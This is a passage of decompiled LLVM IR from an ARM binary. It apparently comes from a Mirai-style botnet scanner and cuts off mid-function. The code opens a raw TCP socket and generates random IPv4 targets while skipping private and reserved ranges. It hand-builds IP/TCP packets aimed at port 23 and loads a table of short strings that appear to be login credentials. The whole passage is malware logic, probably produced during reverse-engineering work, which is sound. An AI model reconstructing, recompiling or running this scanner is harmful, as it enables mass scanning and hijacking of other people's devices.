  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %v6_e550 = load i32, i32* @r5, align 4
  %v21_e550 = load i32, i32* @sl, align 4
  %v0_e55c = call i32 @function_10acc()
  store i32 %v0_e55c, i32* %r0.global-to-local, align 4
  %v7_e560 = icmp eq i32 %v0_e55c, -1
  %. = zext i1 %v7_e560 to i32
  %tmp369 = icmp slt i32 %v0_e55c, 1
  %storemerge329 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge329, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_20a80.129 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e57c = icmp eq i32 %storemerge329, 0
  store i1 %v2_e57c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_e55c, i32* @global_var_20a80.129, align 4
  br i1 %v2_e57c, label %dec_label_pc_e598, label %dec_label_pc_e588

dec_label_pc_e588:                                ; preds = %dec_label_pc_e550
  store i32 %v6_e550, i32* @r5, align 4
  store i32 %v21_e550, i32* @sl, align 4
  ret i32 %v0_e55c

dec_label_pc_e598:                                ; preds = %dec_label_pc_e550
  %v0_e598 = call i32 @function_105d8()
  store i32 %v0_e598, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a5c.46 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_e598, i32* @global_var_20a5c.46, align 4
  %v1_e5a4 = call i32 @function_e114(i32 %v0_e598)
  %v0_e5a8 = load i32, i32* @r4, align 4
  store i32 %v0_e5a8, i32* %r0.global-to-local, align 4
  %v1_e5ac = inttoptr i32 %v0_e5a8 to i32*
  %v2_e5ac = call i32 @function_10a5c(i32* %v1_e5ac)
  store i32 ptrtoint (i32* @global_var_1ea28.121 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_e5ac, i32* @global_var_1ea28.121, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_e5c0 = call i32 @function_1215c(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_20a78.133 to i32), i32* %r3.global-to-local, align 4
  %v0_e5c8 = load i32, i32* @r4, align 4
  store i32 %v0_e5c8, i32* %stack_var_-52, align 4
  store i32 %v2_e5c0, i32* @global_var_20a78.133, align 4
  store i32 %v0_e5c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e5d4

dec_label_pc_e5d4:                                ; preds = %dec_label_pc_e5d4.dec_label_pc_e5d4_crit_edge, %dec_label_pc_e598
  %v2_e5e0 = phi i32 [ %v2_e5e0.pre, %dec_label_pc_e5d4.dec_label_pc_e5d4_crit_edge ], [ %v2_e5c0, %dec_label_pc_e598 ]
  %v0_e5e8 = phi i32 [ %v0_e618, %dec_label_pc_e5d4.dec_label_pc_e5d4_crit_edge ], [ %v0_e5c8, %dec_label_pc_e598 ]
  %v3_e5dc = mul i32 %v0_e5e8, 256
  store i32 %v3_e5dc, i32* %ip.global-to-local, align 4
  %v2_e5f0 = mul i32 %v0_e5e8, 288
  %v1_e5f8 = add i32 %v0_e5e8, 1
  store i32 %v1_e5f8, i32* %r0.global-to-local, align 4
  %v2_e5fc = add i32 %v2_e5f0, %v2_e5e0
  store i32 %v2_e5fc, i32* %r2.global-to-local, align 4
  store i32 %v2_e5fc, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_e610 = add i32 %v2_e5fc, 4
  %v3_e610 = inttoptr i32 %v2_e610 to i32*
  store i32 -1, i32* %v3_e610, align 4
  %v0_e614 = load i32, i32* @r5, align 4
  %v1_e614 = load i32, i32* %r1.global-to-local, align 4
  %v2_e614 = add i32 %v1_e614, 12
  %v3_e614 = inttoptr i32 %v2_e614 to i32*
  store i32 %v0_e614, i32* %v3_e614, align 4
  %v0_e618 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e618, i32* %stack_var_-52, align 4
  %v7_e61c = icmp sgt i32 %v1_e5f8, 255
  br i1 %v7_e61c, label %dec_label_pc_e620, label %dec_label_pc_e5d4.dec_label_pc_e5d4_crit_edge

dec_label_pc_e5d4.dec_label_pc_e5d4_crit_edge:    ; preds = %dec_label_pc_e5d4
  %v2_e5e0.pre = load i32, i32* @global_var_20a78.133, align 4
  br label %dec_label_pc_e5d4

dec_label_pc_e620:                                ; preds = %dec_label_pc_e5d4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_e62c = call i32 @function_115f4(i32 2, i32 3, i32 6)
  store i32 %v3_e62c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a7c.135 to i32), i32* %r2.global-to-local, align 4
  %v2_e634 = icmp eq i32 %v3_e62c, -1
  store i1 %v2_e634, i1* %cpsr_c.global-to-local, align 1
  %v7_e634 = icmp eq i32 %v3_e62c, -1
  store i1 %v7_e634, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e62c, i32* @r4, align 4
  store i32 %v3_e62c, i32* @global_var_20a7c.135, align 4
  br i1 %v7_e634, label %dec_label_pc_e620.dec_label_pc_fbf4_crit_edge, label %dec_label_pc_e644

dec_label_pc_e620.dec_label_pc_fbf4_crit_edge:    ; preds = %dec_label_pc_e620
  %.pre283 = ptrtoint i8* %stack_var_-56 to i32
  br label %dec_label_pc_fbf4

dec_label_pc_e644:                                ; preds = %dec_label_pc_e620
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_e648 = load i32, i32* @r5, align 4
  store i32 %v0_e648, i32* %r2.global-to-local, align 4
  %v2_e64c = call i32 @function_10c10(i32 %v3_e62c, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e654 = or i32 %v2_e64c, 2048
  store i32 %v1_e654, i32* %r2.global-to-local, align 4
  %v0_e658 = load i32, i32* @r4, align 4
  store i32 %v0_e658, i32* %r0.global-to-local, align 4
  %v2_e65c = call i32 @function_10c10(i32 %v0_e658, i32 4)
  %v2_e664 = load i32, i32* @global_var_20a7c.135, align 4
  store i32 %v2_e664, i32* %r0.global-to-local, align 4
  %v2_e668 = ptrtoint i8* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_e670 = load i32, i32* @r5, align 4
  store i32 %v0_e670, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_e678 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e678, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_e688 = call i32 @function_115b0(i32 %v2_e664, i32 %v0_e670, i32 3, i32 %v2_e678, i32 4)
  store i32 %v5_e688, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e68c = icmp eq i32 %v5_e688, 0
  store i1 %v2_e68c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e68c, label %dec_label_pc_e694, label %dec_label_pc_fbe8

dec_label_pc_e694:                                ; preds = %dec_label_pc_e644, %dec_label_pc_e694
  %v0_e694 = call i32 @function_e0b8()
  %v3_e698 = mul i32 %v0_e694, 65536
  store i32 %v3_e698, i32* %r0.global-to-local, align 4
  %v1_e6a0 = mul i32 %v0_e694, 256
  %v3_e6a4 = and i32 %v1_e6a0, 65280
  %tmp372 = udiv i32 %v0_e694, 256
  %v4_e6a8 = urem i32 %tmp372, 256
  %v5_e6a8 = or i32 %v4_e6a8, %v3_e6a4
  store i32 %v5_e6a8, i32* %r3.global-to-local, align 4
  %v2_e6ac = icmp ugt i32 %v5_e6a8, 1023
  store i1 %v2_e6ac, i1* %cpsr_c.global-to-local, align 1
  %v7_e6ac = icmp eq i32 %v5_e6a8, 1024
  store i1 %v7_e6ac, i1* %cpsr_z.global-to-local, align 1
  %v3_e6b4 = icmp ult i32 %v5_e6a8, 1022
  br i1 %v3_e6b4, label %dec_label_pc_e694, label %dec_label_pc_e6b8

dec_label_pc_e6b8:                                ; preds = %dec_label_pc_e694
  %v5_e6b0.le = trunc i32 %v0_e694 to i16
  store i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32* %r0.global-to-local, align 4
  %v2_e6bc = load i8, i8* bitcast (i8** @global_var_1e9f8.137 to i8*), align 4
  %v3_e6bc = zext i8 %v2_e6bc to i32
  %v1_e6c0 = and i32 %v3_e6bc, 240
  %v1_e6c4 = or i32 %v1_e6c0, 5
  store i32 %v1_e6c4, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_1e9f8.137 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_1e9fa.138 to i16*), align 4
  %v0_e6e4 = call i32 @function_e0b8()
  %v1_e6e4 = trunc i32 %v0_e6e4 to i16
  %v3_e6ec = load i8, i8* @global_var_1ea18.141, align 1
  store i32 ptrtoint (i16* @global_var_1ea0c.140 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32* %ip.global-to-local, align 4
  %v1_e6fc = urem i8 %v3_e6ec, 16
  store i16 %v1_e6e4, i16* bitcast (i32* @global_var_1e9fc.142 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_e70c = or i8 %v1_e6fc, 80
  store i8 64, i8* bitcast (i32* @global_var_1ea00.143 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_1ea01.144 to i8*), align 4
  store i8 %v1_e70c, i8* @global_var_1ea18.141, align 1
  %v4_e71c = sext i16 %v5_e6b0.le to i32
  store i32 %v4_e71c, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_1ea0e.145, align 2
  store i16 %v5_e6b0.le, i16* @global_var_1ea0c.140, align 2
  %v0_e72c = call i32 @function_e0b8()
  %v1_e72c = trunc i32 %v0_e72c to i16
  %v3_e734 = load i8, i8* @global_var_1ea19.146, align 1
  %v4_e734 = zext i8 %v3_e734 to i32
  store i32 ptrtoint (i16* @global_var_1ea0c.140 to i32), i32* %ip.global-to-local, align 4
  %v1_e73c = or i32 %v4_e734, 2
  store i32 %v1_e73c, i32* %r3.global-to-local, align 4
  store i16 %v1_e72c, i16* bitcast (i32* @global_var_1ea1a.147 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_161a0.149 to i32), i32* %r1.global-to-local, align 4
  %v1_e748 = trunc i32 %v1_e73c to i8
  store i8 %v1_e748, i8* @global_var_1ea19.146, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e754 = call i32 @function_e3f0(i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32 ptrtoint (i32* @global_var_161a0.149 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_161a4.153 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_e764 = call i32 @function_e3f0(i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32 ptrtoint ([5 x i8]* @global_var_161a4.153 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_161ac.155 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e774 = call i32 @function_e3f0(i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32 ptrtoint ([9 x i8]* @global_var_161ac.155 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_161b8.157 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_161b8.157 to i32), i32* %r1.global-to-local, align 4
  %v5_e784 = call i32 @function_e3f0(i32 ptrtoint ([7 x i8]* @global_var_161b8.157 to i32), i32 ptrtoint ([7 x i8]* @global_var_161b8.157 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_161c0.159 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_161a0.149 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_e794 = call i32 @function_e3f0(i32 ptrtoint ([8 x i8]* @global_var_161c0.159 to i32), i32 ptrtoint (i32* @global_var_161a0.149 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_161c8.161 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e7a4 = call i32 @function_e3f0(i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32 ptrtoint ([9 x i8]* @global_var_161c8.161 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_161d4.163 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_161d4.163 to i32), i32* %r1.global-to-local, align 4
  %v5_e7b4 = call i32 @function_e3f0(i32 ptrtoint ([6 x i8]* @global_var_161d4.163 to i32), i32 ptrtoint ([6 x i8]* @global_var_161d4.163 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_161dc.165 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e7c4 = call i32 @function_e3f0(i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32 ptrtoint ([6 x i8]* @global_var_161dc.165 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_161e4.167 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_161e4.167 to i32), i32* %r1.global-to-local, align 4
  %v5_e7d4 = call i32 @function_e3f0(i32 ptrtoint ([8 x i8]* @global_var_161e4.167 to i32), i32 ptrtoint ([8 x i8]* @global_var_161e4.167 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_161c0.159 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_e7e4 = call i32 @function_e3f0(i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32 ptrtoint ([8 x i8]* @global_var_161c0.159 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_161ec.169 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_e7f4 = call i32 @function_e3f0(i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32 ptrtoint (i32* @global_var_161ec.169 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_161fc.171 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e804 = call i32 @function_e3f0(i32 ptrtoint ([5 x i8]* @global_var_1619c.151 to i32), i32 ptrtoint ([6 x i8]* @global_var_161fc.171 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_16204.173 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_16204.173 to i32), i32* %r1.global-to-local, align 4
  %v5_e814 = call i32 @function_e3f0(i32 ptrtoint ([5 x i8]* @global_var_16204.173 to i32), i32 ptrtoint ([5 x i8]* @global_var_16204.173 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_16204.173 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_161fc.171 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e824 = call i32 @function_e3f0(i32 ptrtoint ([5 x i8]* @global_var_16204.173 to i32), i32 ptrtoint ([6 x i8]* @global_var_161fc.171 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_161c0.159 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1620c.175 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e834 = call i32 @function_e3f0(i32 ptrtoint ([8 x i8]* @global_var_161c0.159 to i32), i32 ptrtoint (i32* @global_var_1620c.175 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_161c0.159 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_16218.177 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e844 = call i32 @function_e3f0(i32 ptrtoint ([8 x i8]* @global_var_161c0.159 to i32), i32 ptrtoint (i32* @global_var_16218.177 to i32), i32 15)
  store i32 %v4_e844, i32* %r0.global-to-local, align 4
  %v2_e84c = ptrtoint i32* %stack_var_-1866 to i32
  %v1_eb78 = add i32 %v2_e84c, 20
  %v1_ebcc = add i32 %v2_e84c, 16
  %v2_ebcc = inttoptr i32 %v1_ebcc to i32*
  %v1_ebe0 = add i32 %v2_e84c, 9
  %v2_ebe0 = inttoptr i32 %v1_ebe0 to i8*
  %v1_ec74 = add i32 %v2_e84c, 12
  %v2_ec74 = inttoptr i32 %v1_ec74 to i32*
  %v2_ee58 = ptrtoint i32* %stack_var_-40 to i32
  %v2_eea0 = ptrtoint i32* %stack_var_-68 to i32
  %v2_eea4 = ptrtoint i32* %stack_var_-224 to i32
  %v2_eea8 = ptrtoint i32* %stack_var_-352 to i32
  %v2_f87c = ptrtoint i32* %stack_var_-45 to i32
  %v2_f890 = ptrtoint i32* %stack_var_-77 to i32
  %v2_f7e8 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f9a4 = ptrtoint i32* %stack_var_-104 to i32
  %v2_e874 = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_e854

dec_label_pc_e854:                                ; preds = %dec_label_pc_f03c, %dec_label_pc_e6b8
  %stack_var_-1876.0 = phi i32 [ %tmp334, %dec_label_pc_e6b8 ], [ %stack_var_-1876.1, %dec_label_pc_f03c ]
  store i32 ptrtoint (i32* @global_var_1ea28.121 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  %v2_e85c = load i32, i32* @global_var_1ea28.121, align 4
  store i32 %v2_e85c, i32* @r4, align 4
  %v3_e860 = icmp uge i32 %stack_var_-1876.0, %v2_e85c
  store i1 %v3_e860, i1* %cpsr_c.global-to-local, align 1
  %v9_e860 = icmp eq i32 %stack_var_-1876.0, %v2_e85c
  store i1 %v9_e860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e860, label %dec_label_pc_eb68, label %dec_label_pc_e868

dec_label_pc_e868:                                ; preds = %dec_label_pc_e854
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_e878

dec_label_pc_e878:                                ; preds = %bb407, %dec_label_pc_e868
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_e88c = call i32 @function_e0b8()
  %v1_e88c = trunc i32 %v0_e88c to i16
  store i32 %v0_e88c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a5c.46 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1e9f8.137 to i32), i32* %ip.global-to-local, align 4
  %v2_e898 = load i32, i32* @global_var_20a5c.46, align 4
  store i32 %v2_e898, i32* %r3.global-to-local, align 4
  store i16 %v1_e88c, i16* bitcast (i32* @global_var_1e9fc.142 to i16*), align 4
  store i32 %v2_e898, i32* @global_var_1ea04.178, align 4
  br label %dec_label_pc_e8a4

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_e9fc, %dec_label_pc_e8d4, %dec_label_pc_ea30, %dec_label_pc_ea24, %dec_label_pc_ea18, %dec_label_pc_ea0c, %.thread48, %.thread32, %.thread28, %.thread24, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_e970, %dec_label_pc_e968, %bb383, %dec_label_pc_e938, %dec_label_pc_e914, %bb376, %dec_label_pc_e8e4, %bb375, %dec_label_pc_e8cc, %bb374, %bb400, %dec_label_pc_e878
  %v0_e8a4 = call i32 @function_e0b8()
  store i32 %v0_e8a4, i32* %r0.global-to-local, align 4
  %v1_e8a8 = urem i32 %v0_e8a4, 256
  store i32 %v1_e8a8, i32* %r1.global-to-local, align 4
  %v3_e8ac = udiv i32 %v0_e8a4, 256
  store i32 %v3_e8ac, i32* %r3.global-to-local, align 4
  %v3_e8b0 = udiv i32 %v0_e8a4, 65536
  store i32 %v3_e8b0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e8b4 = icmp eq i32 %v1_e8a8, 0
  store i1 %v2_e8b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8b4, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_e8a4
  %v3_e8b8 = icmp ugt i32 %v1_e8a8, 126
  store i1 %v3_e8b8, i1* %cpsr_c.global-to-local, align 1
  %v8_e8b8 = icmp eq i32 %v1_e8a8, 127
  store i1 %v8_e8b8, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_e8a4, %bb373
  %v0_e8c8 = phi i1 [ true, %dec_label_pc_e8a4 ], [ %v8_e8b8, %bb373 ]
  %v1_e8bc = urem i32 %v3_e8ac, 256
  store i32 %v1_e8bc, i32* %ip.global-to-local, align 4
  %v1_e8c0 = urem i32 %v3_e8b0, 256
  store i32 %v1_e8c0, i32* %r2.global-to-local, align 4
  %v1_e8c4 = and i32 %v0_e8a4, 8388608
  %v2_e8c4 = icmp ne i32 %v1_e8c4, 0
  store i1 %v2_e8c4, i1* %cpsr_c.global-to-local, align 1
  %v3_e8c4 = udiv i32 %v0_e8a4, 16777216
  store i32 %v3_e8c4, i32* %r0.global-to-local, align 4
  br i1 %v0_e8c8, label %dec_label_pc_e8a4, label %dec_label_pc_e8cc

dec_label_pc_e8cc:                                ; preds = %bb374
  %v2_e8cc = icmp ugt i32 %v1_e8a8, 2
  store i1 %v2_e8cc, i1* %cpsr_c.global-to-local, align 1
  %v7_e8cc = icmp eq i32 %v1_e8a8, 3
  store i1 %v7_e8cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8cc, label %dec_label_pc_e8a4, label %dec_label_pc_e8d4

dec_label_pc_e8d4:                                ; preds = %dec_label_pc_e8cc
  %v1_e8d4 = add nsw i32 %v1_e8a8, -15
  store i32 %v1_e8d4, i32* %r3.global-to-local, align 4
  %v2_e8d8 = icmp ugt i32 %v1_e8a8, 55
  store i1 %v2_e8d8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8d8 = icmp eq i32 %v1_e8a8, 56
  store i1 %v7_e8d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8d8, label %dec_label_pc_e8a4, label %bb375

bb375:                                            ; preds = %dec_label_pc_e8d4
  %v3_e8dc = icmp ne i32 %v1_e8d4, 0
  store i1 %v3_e8dc, i1* %cpsr_c.global-to-local, align 1
  %v8_e8dc = icmp eq i32 %v1_e8d4, 1
  store i1 %v8_e8dc, i1* %cpsr_z.global-to-local, align 1
  %v2_e8e0 = xor i1 %v3_e8dc, true
  %v3_e8e0 = or i1 %v8_e8dc, %v2_e8e0
  br i1 %v3_e8e0, label %dec_label_pc_e8a4, label %dec_label_pc_e8e4

dec_label_pc_e8e4:                                ; preds = %bb375
  %v2_e8e4 = icmp ugt i32 %v1_e8a8, 9
  store i1 %v2_e8e4, i1* %cpsr_c.global-to-local, align 1
  %v7_e8e4 = icmp eq i32 %v1_e8a8, 10
  store i1 %v7_e8e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8e4, label %dec_label_pc_e8a4, label %dec_label_pc_e8ec

dec_label_pc_e8ec:                                ; preds = %dec_label_pc_e8e4
  %v2_e8ec = icmp ugt i32 %v1_e8a8, 191
  store i1 %v2_e8ec, i1* %cpsr_c.global-to-local, align 1
  %v7_e8ec = icmp eq i32 %v1_e8a8, 192
  store i1 %v7_e8ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8ec, label %bb376, label %dec_label_pc_e8f8

bb376:                                            ; preds = %dec_label_pc_e8ec
  %v3_e8f0 = icmp ugt i32 %v1_e8bc, 167
  store i1 %v3_e8f0, i1* %cpsr_c.global-to-local, align 1
  %v8_e8f0 = icmp eq i32 %v1_e8bc, 168
  store i1 %v8_e8f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8f0, label %dec_label_pc_e8a4, label %dec_label_pc_e8f8

dec_label_pc_e8f8:                                ; preds = %dec_label_pc_e8ec, %bb376
  %v7_e8f8 = icmp eq i32 %v1_e8a8, 172
  %.461 = zext i1 %v7_e8f8 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_e904 = icmp ugt i32 %v1_e8bc, 14
  store i1 %v2_e904, i1* %cpsr_c.global-to-local, align 1
  %v7_e904 = icmp eq i32 %v1_e8bc, 15
  store i1 %v7_e904, i1* %cpsr_z.global-to-local, align 1
  %v2_e908 = xor i1 %v2_e904, true
  %v3_e908 = or i1 %v7_e904, %v2_e908
  br i1 %v3_e908, label %.thread8, label %bb379

.thread8:                                         ; preds = %dec_label_pc_e8f8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e91c

bb379:                                            ; preds = %dec_label_pc_e8f8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e90c = icmp eq i1 %v7_e8f8, false
  store i1 %v2_e90c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e90c, label %dec_label_pc_e91c, label %dec_label_pc_e914

dec_label_pc_e914:                                ; preds = %bb379
  %v2_e914 = icmp ugt i32 %v1_e8bc, 30
  store i1 %v2_e914, i1* %cpsr_c.global-to-local, align 1
  %v7_e914 = icmp eq i32 %v1_e8bc, 31
  store i1 %v7_e914, i1* %cpsr_z.global-to-local, align 1
  %v2_e918 = xor i1 %v2_e914, true
  %v3_e918 = or i1 %v7_e914, %v2_e918
  br i1 %v3_e918, label %dec_label_pc_e8a4, label %dec_label_pc_e91c

dec_label_pc_e91c:                                ; preds = %.thread8, %dec_label_pc_e914, %bb379
  %v7_e91c = icmp eq i32 %v1_e8a8, 100
  %.462 = zext i1 %v7_e91c to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_e928 = icmp ugt i32 %v1_e8bc, 62
  store i1 %v2_e928, i1* %cpsr_c.global-to-local, align 1
  %v7_e928 = icmp eq i32 %v1_e8bc, 63
  store i1 %v7_e928, i1* %cpsr_z.global-to-local, align 1
  %v2_e92c = xor i1 %v2_e928, true
  %v3_e92c = or i1 %v7_e928, %v2_e92c
  br i1 %v3_e92c, label %.thread13, label %bb382

.thread13:                                        ; preds = %dec_label_pc_e91c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e940

bb382:                                            ; preds = %dec_label_pc_e91c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e930 = icmp eq i1 %v7_e91c, false
  store i1 %v2_e930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e930, label %dec_label_pc_e940, label %dec_label_pc_e938

dec_label_pc_e938:                                ; preds = %bb382
  %v2_e938 = icmp ugt i32 %v1_e8bc, 125
  store i1 %v2_e938, i1* %cpsr_c.global-to-local, align 1
  %v7_e938 = icmp eq i32 %v1_e8bc, 126
  store i1 %v7_e938, i1* %cpsr_z.global-to-local, align 1
  %v2_e93c = xor i1 %v2_e938, true
